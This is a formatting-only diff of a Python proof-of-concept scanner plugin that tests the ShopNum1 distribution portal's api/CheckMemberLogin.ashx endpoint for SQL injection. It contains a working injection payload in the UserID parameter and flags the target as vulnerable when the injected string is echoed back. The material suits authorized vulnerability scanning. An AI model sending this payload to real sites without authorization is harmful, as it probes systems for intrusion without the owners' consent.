@@ -1,15 +1,15 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 
 class Vuln(ABVuln):
-    vuln_id = 'ShopNum1_0000' # 平台漏洞编号，留空
+    vuln_id = 'ShopNum1_0000'  # 平台漏洞编号，留空
     name = 'ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2016-01-24'  # 漏洞公布时间
     desc = '''
         ShopNum1分销门户系统 api/CheckMemberLogin.ashx注入。
@@ -19,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ShopNum1'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '9070bef3-e972-4125-9323-4d973a9ff97d'
@@ -32,20 +33,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-        
+
             arg = '{target}'.format(target=self.target)
             payload = "/api/CheckMemberLogin.ashx?UserID=0'%20and%20(CHAR(116)%2bCHAR(101)%2bCHAR(115)%2bCHAR(116))>0--&type=UserIsExist"
             target = arg + payload
             code, head, res, errcode, _ = hh.http(target)
             if code == 200 and "test" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
